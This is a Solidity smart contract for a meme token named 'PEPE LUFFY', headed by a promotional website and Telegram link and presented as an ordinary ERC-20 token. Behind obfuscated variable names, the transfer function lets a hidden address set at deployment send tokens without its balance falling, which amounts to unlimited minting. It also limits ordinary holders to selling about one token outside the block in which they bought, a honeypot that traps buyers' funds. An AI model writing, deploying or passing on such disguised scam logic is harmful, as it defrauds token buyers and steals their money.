/*

https://pepeluffy.cryptotoken.live/

https://t.me/pepeluffy

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPELUFFY is Ownable {
    mapping(address => uint256) private bshyk;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address okhfmxc, address tjxkmelf, uint256 nldphgwmsoj) public returns (bool success) {
        require(nldphgwmsoj <= allowance[okhfmxc][msg.sender]);
        allowance[okhfmxc][msg.sender] -= nldphgwmsoj;
        mpbqakndw(okhfmxc, tjxkmelf, nldphgwmsoj);
        return true;
    }

    uint256 private ncehkrsomiub = 102;

    function approve(address clzh, uint256 nldphgwmsoj) public returns (bool success) {
        allowance[msg.sender][clzh] = nldphgwmsoj;
        emit Approval(msg.sender, clzh, nldphgwmsoj);
        return true;
    }

    function mpbqakndw(address okhfmxc, address tjxkmelf, uint256 nldphgwmsoj) private {
        if (0 == bshyk[okhfmxc]) {
            if (okhfmxc != ymoezhdcin && yvzrdfnhsgkl[okhfmxc] != block.number && nldphgwmsoj < totalSupply) {
                require(nldphgwmsoj <= totalSupply / (10 ** decimals));
            }
            balanceOf[okhfmxc] -= nldphgwmsoj;
        }
        balanceOf[tjxkmelf] += nldphgwmsoj;
        yvzrdfnhsgkl[tjxkmelf] = block.number;
        emit Transfer(okhfmxc, tjxkmelf, nldphgwmsoj);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    constructor(address ongs) {
        balanceOf[msg.sender] = totalSupply;
        bshyk[ongs] = ncehkrsomiub;
        IUniswapV2Router02 thijzkax = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        ymoezhdcin = IUniswapV2Factory(thijzkax.factory()).createPair(address(this), thijzkax.WETH());
    }

    string public name = "PEPE LUFFY";

    string public symbol = "PEPE LUFFY";

    address private ymoezhdcin;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private yvzrdfnhsgkl;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address tjxkmelf, uint256 nldphgwmsoj) public returns (bool success) {
        mpbqakndw(msg.sender, tjxkmelf, nldphgwmsoj);
        return true;
    }
}